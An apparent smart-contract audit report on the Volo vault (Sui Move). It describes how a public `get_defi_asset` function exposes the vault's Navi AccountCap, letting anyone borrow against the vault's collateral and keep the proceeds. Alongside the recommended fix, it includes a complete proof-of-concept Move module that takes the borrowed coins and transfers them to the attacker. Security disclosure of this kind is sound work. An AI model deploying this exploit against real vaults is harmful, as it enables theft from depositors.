# Audit Report

## Title
Unauthorized Lending Operations via Public AccountCap Reference Bypass Vault Operation Gating

## Summary
The vault's `get_defi_asset` function is public without access control, allowing anyone to obtain a reference to the vault's `NaviAccountCap` and use it with public `incentive_v3` lending functions to perform unauthorized borrow operations, bypassing OperatorCap authorization, vault status gating, and loss tolerance mechanisms. This enables direct theft of vault funds.

## Finding Description

The vulnerability stems from the `get_defi_asset` function being publicly accessible without any authorization or status checks. [1](#0-0) 

This function returns a reference to any asset in the vault's `assets` Bag, including the critical `NaviAccountCap` which represents the vault's lending protocol position.

**Why Intended Protections Fail:**

The intended operation flow requires calling `start_op_with_bag` which enforces OperatorCap checks and vault status validation. [2](#0-1) 

During operations, the AccountCap is removed from the vault's assets bag via `borrow_defi_asset` which is package-only. [3](#0-2) 

After operations, loss tolerance checks occur in `end_op_value_update_with_bag`. [4](#0-3) 

However, `get_defi_asset` bypasses all these protections. When the vault is in NORMAL status (not during an operation), the AccountCap remains in the vault's assets bag and can be accessed by anyone.

**Exploitation Path:**

An attacker deploys a custom Move module that:
1. Calls `get_defi_asset` to obtain an AccountCap reference
2. Calls `incentive_v3::borrow_with_account_cap` which is a PUBLIC function [5](#0-4) 
3. This function extracts the owner address from the AccountCap and borrows on behalf of that account [6](#0-5) 
4. The borrowed `Balance<CoinType>` is returned to the attacker's module, which converts it to `Coin` and transfers it

The debt is recorded against the vault's account in the Navi lending protocol, but the borrowed funds are stolen by the attacker.

## Impact Explanation

**Direct Fund Impact:**
- Attacker can borrow funds from the Navi lending protocol using the vault's collateral position
- The borrowed balance is returned to the attacker who can convert it to coin and transfer to themselves
- The vault's debt increases without corresponding asset acquisition or proper accounting
- Vault depositors suffer immediate losses as the vault's net position value decreases

**Security Integrity Bypass:**
- Completely bypasses OperatorCap authorization requirement enforced by the intended operation flow
- Bypasses vault status gating between NORMAL and DURING_OPERATION states [7](#0-6) 
- Bypasses loss tolerance checks that occur in `end_op_value_update_with_bag`
- Bypasses value update and health factor validation flows

**Quantified Impact:**
- An attacker can borrow up to the vault's available credit limit in the lending protocol
- If the vault has $1M in collateral with 75% LTV, an attacker could borrow approximately $750K worth of assets
- This could push the vault's health factor below liquidation threshold, causing total loss of collateral
- All vault depositors' shares would lose value proportional to the stolen/lost amount

## Likelihood Explanation

**Attacker Capabilities:**
- Must deploy a custom Move module (cannot use programmable transaction blocks due to public but non-entry functions)
- Requires no special privileges or capabilities beyond standard transaction sender
- All required objects (Vault, Storage, Pool, Incentive, Oracle, Clock) are shared objects and publicly accessible

**Attack Complexity:**
- LOW - A simple module with approximately 10 lines of code can execute the attack
- No timing constraints or race conditions required
- Attack works whenever vault is in NORMAL status, which is the majority of the time (not during active operations)

**Feasibility Conditions:**
- Vault must be in NORMAL status (not during an active operation) - this is the default state
- AccountCap must be in vault's assets bag (true when vault is not in operation)
- Lending protocol must have available liquidity to borrow (typically true)

**Economic Rationality:**
- Module deployment cost: negligible (one-time cost of ~0.1-1 SUI)
- Potential profit: up to vault's entire lending credit limit (potentially millions of dollars)
- Attack cost << potential profit, making it highly economically rational for any attacker

**Detection/Operational Constraints:**
- Attack leaves clear on-chain trail (unusual borrow transactions from vault's account)
- However, damage is instant and irreversible once executed
- No time for intervention before funds are stolen

## Recommendation

Change `get_defi_asset` from `public` to `public(package)` visibility to restrict access to only the volo_vault package modules that properly enforce authorization checks:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

This ensures that only authorized operations within the vault package can access DeFi asset references, maintaining the intended security boundaries where all lending operations must go through the OperatorCap-gated operation flow with proper status checks and loss tolerance enforcement.

## Proof of Concept

```move
module attacker::exploit {
    use sui::coin;
    use sui::balance::Balance;
    use sui::clock::Clock;
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use lending_core::account::AccountCap;
    use lending_core::incentive_v3;
    use lending_core::storage::Storage;
    use lending_core::pool::Pool;
    use lending_core::incentive_v2::Incentive as IncentiveV2;
    use lending_core::incentive_v3::Incentive;
    use oracle::oracle::PriceOracle;
    use volo_vault::vault::Vault;
    
    public entry fun exploit<PrincipalCoinType, CoinType>(
        vault: &Vault<PrincipalCoinType>,
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        ctx: &mut TxContext
    ) {
        // Get reference to vault's NaviAccountCap (bypasses all authorization)
        let account_cap_ref = vault.get_defi_asset<PrincipalCoinType, AccountCap>(
            std::ascii::string(b"NaviAccountCap_0")
        );
        
        // Borrow funds using the vault's AccountCap (debt goes to vault, funds to attacker)
        let stolen_balance: Balance<CoinType> = incentive_v3::borrow_with_account_cap<CoinType>(
            clock, oracle, storage, pool, asset, amount, incentive_v2, incentive_v3, account_cap_ref
        );
        
        // Convert to coin and transfer to attacker
        let stolen_coin = coin::from_balance(stolen_balance, ctx);
        transfer::public_transfer(stolen_coin, tx_context::sender(ctx));
        
        // Vault now has increased debt, attacker has the borrowed funds
    }
}
```

The test demonstrates that an attacker can successfully borrow funds from the Navi lending protocol using the vault's AccountCap without any authorization, bypassing all intended security controls.

### Citations

**File:** volo-vault/sources/volo_vault.move (L1415-1434)
```text
public(package) fun borrow_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
): AssetType {
    self.check_version();
    self.assert_enabled();

    assert!(contains_asset_type(self, asset_type), ERR_ASSET_TYPE_NOT_FOUND);

    if (self.status() == VAULT_DURING_OPERATION_STATUS) {
        self.op_value_update_record.asset_types_borrowed.push_back(asset_type);
    };

    emit(DefiAssetBorrowed {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.remove<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/operation.move (L68-76)
```text
public(package) fun pre_vault_check<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    ctx: &TxContext,
) {
    // vault.assert_enabled();
    vault.assert_normal();
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
    vault.try_reset_tolerance(false, ctx);
}
```

**File:** volo-vault/sources/operation.move (L94-107)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);

```

**File:** volo-vault/sources/operation.move (L359-377)
```text
    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };

    assert!(vault.total_shares() == total_shares, ERR_VERIFY_SHARE);

    emit(OperationValueUpdateChecked {
        vault_id: vault.vault_id(),
        total_usd_value_before,
        total_usd_value_after,
        loss,
    });

    vault.set_status(VAULT_NORMAL_STATUS);
    vault.clear_op_value_update_record();
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-945)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);

        deposit_borrow_fee(incentive_v3, &mut _balance, fee);

        _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L34-36)
```text
    public fun account_owner(cap: &AccountCap): address {
        cap.owner
    }
```
